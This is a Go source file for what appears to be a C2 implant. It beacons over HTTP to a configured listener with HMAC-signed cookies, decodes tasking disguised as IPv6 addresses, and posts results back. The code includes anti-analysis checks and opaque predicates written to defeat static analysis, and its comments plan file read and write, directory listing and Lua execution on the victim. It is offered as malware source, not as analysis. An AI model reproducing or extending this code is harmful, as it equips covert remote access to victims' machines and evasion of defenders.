package main

import (
	"0xo0xo0xo0xo0/z/anti"
	"0xo0xo0xo0xo0/z/rogue"
	"0xo0xo0xo0xo0/z/shared"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	b "reflect"
)

// ResponseData Struct to hold the response format from the server
// The key is the HMAC used to verify the data retrieved using a shared secret
type ResponseData struct {
	Message string `json:"message"`
	Key     string `json:"key"`
}

// CompUUID The 4 byte ID for the implant to use set at compile time
var CompUUID string

// PostURI The POST URI to use, varies on if compression is enabled or not
var PostURI string

// GetURI The GET URI to use, varies on if auth is enabled or not
var GetURI string

// Used to mess up static analysis
type unknown struct {
	primaryField bool
}

func opaqueBasedOnModulo(x int) bool {
	return (x*x+2*x+1)%2 == 1 // This is always odd for x != -1
}

func runTimeCheck() bool {
	hidden := unknown{primaryField: false}
	v := b.ValueOf(hidden)
	return v.Field(0).Bool()
}

func X1A9T(x int) bool {
	rand.NewSource(int64(x) ^ 0xDEADBEEF)

	a := (x*3 + 42) ^ (x >> 2)
	b2 := (a & 0xFF) + ((a >> 8) & 0xFF) + ((a >> 16) & 0xFF)
	c := (a * b2) ^ 0xCAFEBABE
	d := (c % 97) * (x % 31)

	hash := sha256.Sum256([]byte(fmt.Sprintf("%d", d)))
	intCheck := int(hash[0]) & 1

	if intCheck != 1 && ((x*x+x)&1 == 0) {
		d += x * x
	}

	intCheck1 := ((x ^ 0xABCD) & 0xF0F0) ^ ((d & 0x1234) | 0x55AA)
	if intCheck1 > 100000 {
		d += x << 2
	} else {
		d -= x >> 3
	}

	result := ((d & 0xF) ^ 0xA) == 0xF
	toGet1 := (result && (d|x)%17 == 0) || (d^0xFF != x^0x1234)

	return toGet1 || x == 42
}

func main() {
	/*
		Todo:
		The config should be encrypted at compile time
		Values gotten from it should be decrypted upon use
	*/
	anti.TimingCheck()
	anti.KillTheChild()
	switch runTimeCheck() {
	case true:
		rogue.Func549687354()
		rogue.FuncDF7858354()
		goto XXSFDgs12
	case false:
		if opaqueBasedOnModulo(42) {
			// Load configuration from embedded data
			conf, err := shared.LoadConfig()
			if err != nil {
				// log.Fatalf("Failed to load config: %v", err)
				break
			}

			maxRetries := 3

			for {
				// opaque predicate to branch path again
				baseUrl := ""
				baseUrl = "http://" + conf.Listener + GetURI
				postUrl := ""
				postUrl = "http://" + conf.Listener + PostURI

				token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)

				//reqURL, _ := url.Parse(baseUrl)

				// Prepare the hmac params (timestamp and token)
				// params := http.Cookie{}
				hardVals := fmt.Sprintf("timestamp=%s&token=%s&id=%s", timestamp, token, CompUUID)

				// compedData is hardVals compressed using zlib
				// if enabled at compile time, DoComp returns the compressed object and bool true
				// if disabled (default) the function returns false
				// if false, the params are instead appended to the request uncompressed
				compedData, shouldComp := shared.DoComp(hardVals)
				// anti.TimingCheck()
				if shouldComp {
					//fmt.Println(hardVals)
					encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
					// "da" can be changed to a randomly chosen string to cycle through
					tokenCookie := &http.Cookie{Name: "da", Value: encodedData}
					// makeGetRequest 3 times with a 10 second delay between each attempt
					// if the request is successful, break the loop
					// otherwise, the 3 timeouts cause the program to exit
					resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie)
					if err != nil {
						return
					}
					// Defer closing the response body until the for loop breaks
					defer func(Body io.ReadCloser) {
						err := Body.Close()
						if err != nil {
							return
						}
					}(resp.Body)

					// Check the response status
					if resp.StatusCode != http.StatusOK {
						// non-OK http status
						break
					}

					// Read the response body
					body, err := io.ReadAll(resp.Body)
					if err != nil {
						// reading response body failed
						break
					}

					// Parse the JSON response
					var data ResponseData
					err = json.Unmarshal(body, &data)
					if err != nil {
						// parsing json failed
						break
					}

					// Print the values (for testing)
					// fmt.Println("Message:", data.Message)
					// fmt.Println("Key:", data.Key)

					// The response comes encoded in a hex format that mimics IPv6 IPs
					// Decode that data
					decoded, err := shared.DecodeIPv6ToString(data.Message)
					if err != nil {
						fmt.Println(err)
						break
					}
					fmt.Println("Decoded string:", decoded)

					// Verify the message with the received HMAC
					if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
						fmt.Println("HMAC is valid!")
						// Here is where command processing should occur
						// A switch statement to run through possible command options, including using the lua engine
						// List arbitrary dir, read file, write file, execute Lua
						// Returns the result of execution (stdout or bool) or returns an error

						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
						err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
						if err != nil {
							return
						}
						break

					} else {
						fmt.Println("HMAC is invalid or message was tampered with.")
						break
					}
				} else {
					//fmt.Println("Not compressing data")
					tokenCookie := &http.Cookie{Name: "token", Value: token}
					timestampCookie := &http.Cookie{Name: "timestamp", Value: timestamp}
					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
					//reqURL.RawQuery = params.Encode()
					//fmt.Println(reqURL.String())
					// makeGetRequest 3 times with a 10-second delay between each attempt
					// if the request is successful, break the loop
					// otherwise, the 3 timeouts cause the program to exit
					resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
					if err != nil {
						//fmt.Println("Final error:", err)
						return
					}

					// Defer closing the response body until the for loop breaks
					defer func(Body io.ReadCloser) {
						err := Body.Close()
						if err != nil {
							return
						}
					}(resp.Body)

					// Check the response status
					if resp.StatusCode != http.StatusOK {
						// non-OK http status
						break
					}

					// Read the response body
					body, err := io.ReadAll(resp.Body)
					if err != nil {
						// reading response body failed
						break
					}

					// Parse the JSON response
					var data ResponseData
					err = json.Unmarshal(body, &data)
					if err != nil {
						// parsing json failed
						break
					}

					// Print the values (for testing)
					// fmt.Println("Message:", data.Message)
					// fmt.Println("Key:", data.Key)

					// The response comes encoded in a hex format that mimics IPv6 IPs
					// Decode that data
					_, err = shared.DecodeIPv6ToString(data.Message)
					if err != nil {
						//fmt.Println(err)
						break
					}
					//fmt.Println("Decoded string:", decoded)

					// Verify the message with the received HMAC
					switch shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
					case true:
						fmt.Println("HMAC is valid!")
						// Here is where command processing should occur
						// A switch statement to run through possible command options, including using the lua engine
						// List arbitrary dir, read file, write file, execute Lua
						// Returns the result of execution (stdout or bool) or returns an error

						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
						err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
						if err != nil {
							fmt.Println(err)
						}
						break

					case false:
						fmt.Println("HMAC is invalid or message was tampered with.")
						break
					}
				}
			}
		}
	}
XXSFDgs12:
	var _ = 0
	var XXsd = func(XXsy72757254, XXsy6798234 int) int {
		sum := XXsy72757254 + XXsy6798234
		return sum
	}
	_ = XXsd(5, 3)

	funcName := "X1A9T"
	args := []b.Value{b.ValueOf(23498756213049576)}
	b.ValueOf(map[string]interface{}{
		"X1A9T": X1A9T,
	}[funcName]).Call(args)
}
